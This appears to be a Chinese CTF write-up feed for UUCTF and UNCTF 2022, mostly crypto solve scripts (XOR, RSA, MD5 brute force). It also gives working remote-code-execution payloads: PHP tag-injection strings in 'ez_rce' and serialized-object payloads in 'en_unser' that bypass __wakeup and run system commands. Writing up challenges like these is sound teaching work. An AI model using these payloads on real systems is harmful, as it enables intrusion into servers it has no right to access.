class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目描述先进行Rabbit解码</p><p>然后社会主义核心价值观解密</p><p>然后栅栏密码解密</p><h1 id="easy-base64"><a href="#easy-base64" class="headerlink" title="easy_base64"></a>easy_base64</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64f<span class="token operator">=</span><span class="token string">''</span>b<span class="token operator">=</span><span class="token number">90</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">105</span> <span class="token punctuation">,</span><span class="token number">71</span> <span class="token punctuation">,</span><span class="token number">14</span> <span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">52</span> <span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">37</span> <span class="token punctuation">,</span><span class="token number">17</span> <span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">54</span> <span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">48</span> <span class="token punctuation">,</span><span class="token number">26</span> <span class="token punctuation">,</span><span class="token number">33</span> <span class="token punctuation">,</span><span class="token number">9</span> <span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">108</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      b<span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>b      f<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>f<span class="token operator">+=</span><span class="token string">'='</span>     <span class="token comment">#异或以后发现少一个=，但是问题不大</span>flag<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="简单的数学"><a href="#简单的数学" class="headerlink" title="简单的数学"></a>简单的数学</h1><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON"># from Crypto.Util.number import *# import libnum# from flag import flag# e &#x3D; 65537# p &#x3D; getPrime(1024)# q &#x3D; getPrime(1024)# n &#x3D; p*q# k &#x3D; getRandomNBitInteger(20)# c&#x3D;pow(libnum.s2n(flag)*p+k*n,e,n)# print(n)# print(k)# print(c)# &#39;&#39;&#39;# 462592082768349080220909549757344916952259805582738138946967136528358314821753717325227038311476341057261616824882300840971094398108671686730634522953199485320477369825037835494264368612594110910697087675588798023343938150586183916552348143352032916901783618890855526008248299448901123776094889945844121087885252580121628395910419946496994972305258850973957286676894473867869392346778460319# 25014963863951112347974440214066273048882503259160338255496299775995961351901571648895465031685356024238885233929337483853960374743565692563404769039019561050421788096283392820458449077490390195564801845037357811298274797645813808259301937466827199149702646030007667049110326436048932024335483846993690455310182909643176845321021209137548742937430940258997221937352498631551209822079559591857076641561863821325180714184637516327495056825200929458796589533188382551310078527193764723189551017851538326522660734366263229681834096022505151628784267513086843047784002223603418978827233728149657480292961095596638702578233# 930971# 21332979626247382647148222928588089621511790656630926013612529289276199934646065751526142377438330548167579869346422391777913473113228287023801928140946948279096562923728186040013041739656216576467903409087827269164764659636977412246373447194249307513950780025367450729199178539765363446611686879821064068711525543800807969264271445173422813211738947698740537888866771159352960700295474589207758542367193701819811125602611901272496121027126921035697692984486226677539547135753720071134145590716156803665486826826046693205511230289946748601632769198172373201803516681379607412290191420859001274915183415061321376410345# &#39;&#39;&#39;import gmpy2import libnume &#x3D; 65537n &#x3D; 25014963863951112347974440214066273048882503259160338255496299775995961351901571648895465031685356024238885233929337483853960374743565692563404769039019561050421788096283392820458449077490390195564801845037357811298274797645813808259301937466827199149702646030007667049110326436048932024335483846993690455310182909643176845321021209137548742937430940258997221937352498631551209822079559591857076641561863821325180714184637516327495056825200929458796589533188382551310078527193764723189551017851538326522660734366263229681834096022505151628784267513086843047784002223603418978827233728149657480292961095596638702578233k &#x3D; 930971c &#x3D; 21332979626247382647148222928588089621511790656630926013612529289276199934646065751526142377438330548167579869346422391777913473113228287023801928140946948279096562923728186040013041739656216576467903409087827269164764659636977412246373447194249307513950780025367450729199178539765363446611686879821064068711525543800807969264271445173422813211738947698740537888866771159352960700295474589207758542367193701819811125602611901272496121027126921035697692984486226677539547135753720071134145590716156803665486826826046693205511230289946748601632769198172373201803516681379607412290191420859001274915183415061321376410345p &#x3D; gmpy2.gcd(n,c)q &#x3D; n &#x2F;&#x2F; pphi &#x3D; (p-1)*(q-1)d &#x3D; gmpy2.invert(e,phi)m &#x3D; pow(c,d,n)flag &#x3D;m &#x2F;&#x2F; pprint(libnum.n2s(int(flag)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h1><p>打开得到一个exe文件让他运行最后就得到flag</p><h1 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h1><h1 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h1><p>?&gt;&lt;?&#x3D;<code>l\s /</code></p><p><code>?&gt;&lt;?=ca&quot;&quot;t /fffffffffflagafag </code>;</p><p>NSSCTF{This_IS_s0_easy_RCE}</p><h1 id="en-unser"><a href="#en-unser" class="headerlink" title="en_unser"></a>en_unser</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">###very___so___easy!!!!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/test":3/i'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你输入的不正确！！！搞什么！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是绕过__wakeup这个魔术方法  本来的思路就是CVE但是不行</p><p>所以只能从题目中所给的的三个魔法方法下手</p><p><img src="/2023/02/01/UUCTF/1666365899965.png" alt="1666365899965"></p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:15:&quot;system(&#39;ls &#x2F;&#39;);&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><p><img src="/2023/02/01/UUCTF/1666366018563.png" alt="1666366018563"></p><p><strong><img src="/2023/02/01/UUCTF/1666366051669.png" alt="1666366051669"></strong></p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;s:33:&quot;system(&#39;cat &#x2F;fffffffffflagafag&#39;);&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/01/UUCTF/1666366086629.png" alt="1666366086629"></p>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022UNCTF</title>
      <link href="/2023/02/01/UNCTF/"/>
      <url>/2023/02/01/UNCTF/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00Rank: 60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="MD5-1"><a href="#MD5-1" class="headerlink" title="MD5-1"></a>MD5-1</h2><p>发现out.txt里面都是经过md5加密后的密文  本来想通过直接读取文件写的  但是报错  就通过把内容手写到一个列表里</p><p>然后通过脚本爆破得到</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">s &#x3D; [&#39;4c614360da93c0a041b22e537de151eb&#39;,&#39;8d9c307cb7f3c4a32822a51922d1ceaa&#39;,&#39;0d61f8370cad1d412f80b84d143e1257&#39;,&#39;b9ece18c950afbfa6b0fdbfa4ff731d3&#39;,&#39;800618943025315f869e4e1f09471012&#39;,&#39;f95b70fdc3088560732a5ac135644506&#39;,&#39;e1671797c52e15f763380b45e841ec32&#39;,&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;,&#39;a87ff679a2f3e71d9181a67b7542122c&#39;,&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;,&#39;e1671797c52e15f763380b45e841ec32&#39;,&#39;8277e0910d750195b448797616e091ad&#39;,&#39;cfcd208495d565ef66e7dff9f98764da&#39;,&#39;c81e728d9d4c2f636f067f89cc14862c&#39;,&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;,&#39;92eb5ffee6ae2fec3ad71c777531578f&#39;,&#39;45c48cce2e2d7fbdea1afc51c7c6ad26&#39;,&#39;cfcd208495d565ef66e7dff9f98764da&#39;,&#39;a87ff679a2f3e71d9181a67b7542122c&#39;,&#39;1679091c5a880faf6fb5e6087eb1b2dc&#39;,&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;,&#39;4a8a08f09d37b73795649038408b5f33&#39;,&#39;cfcd208495d565ef66e7dff9f98764da&#39;,&#39;e1671797c52e15f763380b45e841ec32&#39;,&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;,&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;,&#39;cfcd208495d565ef66e7dff9f98764da&#39;,&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;,&#39;cfcd208495d565ef66e7dff9f98764da&#39;,&#39;e1671797c52e15f763380b45e841ec32&#39;,&#39;45c48cce2e2d7fbdea1afc51c7c6ad26&#39;,&#39;1679091c5a880faf6fb5e6087eb1b2dc&#39;,&#39;e1671797c52e15f763380b45e841ec32&#39;,&#39;8f14e45fceea167a5a36dedd4bea2543&#39;,&#39;c81e728d9d4c2f636f067f89cc14862c&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;,&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;,&#39;a87ff679a2f3e71d9181a67b7542122c&#39;,&#39;cbb184dd8e05c9709e5dcaedaa0495cf&#39;,]import hashlibfor i in s:    for w in &#39;&#123;&#125;_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#39;:        md &#x3D; hashlib.md5()        md.update(w.encode())        m&#x3D;md.hexdigest()        if m &#x3D;&#x3D; i:            print(w,end&#x3D;&#39;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>#UNCTF{e84fed028b9046fc0e8f080e96e72184}</p><h2 id="MD5-2"><a href="#MD5-2" class="headerlink" title="MD5-2"></a>MD5-2</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibm<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>m<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'4c614360da93c0a041b22e537de151eb'</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'4c614360da93c0a041b22e537de151eb'</span><span class="token punctuation">,</span><span class="token string">'c1fd731c6d60040369908b4a5f309f41'</span><span class="token punctuation">,</span><span class="token string">'80fdc84bbb5ed9e207a21d5436efdcfd'</span><span class="token punctuation">,</span><span class="token string">'b48d19bb99a7e6bb448f63b75bc92384'</span><span class="token punctuation">,</span><span class="token string">'39eaf918a52fcaa5ed9195e546b021c1'</span><span class="token punctuation">,</span><span class="token string">'795d6869f32db43ff5b414de3c235514'</span><span class="token punctuation">,</span><span class="token string">'f59a054403f933c842e9c3235c136367'</span><span class="token punctuation">,</span><span class="token string">'c80b37816048952a3c0fc9780602a2fa'</span><span class="token punctuation">,</span><span class="token string">'810ecef68e945c3fe7d6accba8b329bd'</span><span class="token punctuation">,</span><span class="token string">'cad06891e0c769c7b02c228c8c2c8865'</span><span class="token punctuation">,</span><span class="token string">'470a96d253a639193530a15487fea36f'</span><span class="token punctuation">,</span><span class="token string">'470a96d253a639193530a15487fea36f'</span><span class="token punctuation">,</span><span class="token string">'4bdea6676e5335f857fa8e47249fa1d8'</span><span class="token punctuation">,</span><span class="token string">'810ecef68e945c3fe7d6accba8b329bd'</span><span class="token punctuation">,</span><span class="token string">'edbb7ab78cde98a07b9b5a2ab284bf0a'</span><span class="token punctuation">,</span><span class="token string">'44b43e07e9af05e3b9b129a287e5a8df'</span><span class="token punctuation">,</span><span class="token string">'a641c08ed66b55c9bd541fe1b22ce5c0'</span><span class="token punctuation">,</span><span class="token string">'abed1f675819a2c0f65c9b7da8cab301'</span><span class="token punctuation">,</span><span class="token string">'738c486923803a1b59ef17329d70bbbd'</span><span class="token punctuation">,</span><span class="token string">'7e209780adf2cd1212e793ae8796ed7c'</span><span class="token punctuation">,</span><span class="token string">'a641c08ed66b55c9bd541fe1b22ce5c0'</span><span class="token punctuation">,</span><span class="token string">'a641c08ed66b55c9bd541fe1b22ce5c0'</span><span class="token punctuation">,</span><span class="token string">'636a84a33e1373324d64463eeb8e7614'</span><span class="token punctuation">,</span><span class="token string">'6ec65b4ab061843b066cc2a2f16820d5'</span><span class="token punctuation">,</span><span class="token string">'a4a39b59eb036a4a8922f7142f874114'</span><span class="token punctuation">,</span><span class="token string">'8c34745bd5b5d42cb3efe381eeb88e4b'</span><span class="token punctuation">,</span><span class="token string">'5b1ba76b1d36847d632203a75c4f74e2'</span><span class="token punctuation">,</span><span class="token string">'d861570e7b9998dbafb38c4f35ba08bc'</span><span class="token punctuation">,</span><span class="token string">'464b7d495dc6019fa4a709da29fc7952'</span><span class="token punctuation">,</span><span class="token string">'8eb69528cd84b73d858be0947f97b7cc'</span><span class="token punctuation">,</span><span class="token string">'dd6ac4c783a9059d11cb0910fc95d4a'</span><span class="token punctuation">,</span><span class="token string">'4b6b0ee5d5f6b24e6898997d765c487c'</span><span class="token punctuation">,</span><span class="token string">'b0762bc356c466d6b2b8f6396f2e041'</span><span class="token punctuation">,</span><span class="token string">'8547287408e2d2d8f3834fc1b90c3be9'</span><span class="token punctuation">,</span><span class="token string">'82947a7d007b9854fa62efb18c9fd91f'</span><span class="token punctuation">,</span><span class="token string">'8ddafe43b36150de851c83d80bd22b0a'</span><span class="token punctuation">,</span><span class="token string">'c7b36c5f23587e285e528527d1263c8b'</span><span class="token punctuation">,</span><span class="token string">'2a0816e8af86e68825c9df0d63a28381'</span><span class="token punctuation">,</span><span class="token string">'63ce72a42cf62e6d0fdc6c96df4687e3'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>      m<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># print(m)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token comment">#发现有两个数据长度不正确  然后判断一下 在前面加上一个  0</span>        a <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">+</span>a    <span class="token keyword">for</span> q <span class="token keyword">in</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_1234567890'</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>q<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> a<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UNCTF{a197271943ceb3c3fe98bcadf10c29d4}</p><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>已知n,e,c然后求得d就可以求出m   </p><p>把n放在在线网站上直接分解  或者利用gmpy2.iroot()开四次方</p><p>根据欧拉公式求得  phi然后既可以求出d</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">import gmpy2import libnump&#x3D;gmpy2.iroot(n)[0]n &#x3D; 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561e &#x3D; 65537c &#x3D; 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504p&#x3D;89065756791595323358603857939783936930073695697065732353414009005162022399741#p&#x3D;gmpy2.iroot(int(n),4)[0]phi &#x3D; p**4 - p**3d &#x3D; gmpy2.invert(e,phi)m &#x3D; pow(c,d,n)print(libnum.n2s(int(m)))#unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="crypto-Multi-table"><a href="#crypto-Multi-table" class="headerlink" title="crypto-Multi table"></a>crypto-Multi table</h2><p>先根据给出的SDCGM  和   UNCTF  爆破出key&#x3D; [9,15,23,16]</p><p>然后利用脚本爆破  然后在对应位置加上  { }  和  _</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">table<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>ascii_uppercase<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>ascii_uppercase<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>scii_uppercase <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">]</span>base_table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token comment"># c = 'SDCGW'</span>c <span class="token operator">=</span> <span class="token string">'SDCGWMPNVHGAXHUGERASMEZJNDBWNUZHETD'</span><span class="token comment"># for i in range(0,25):</span><span class="token comment">#     s = table[i][base_table.index('T')]</span><span 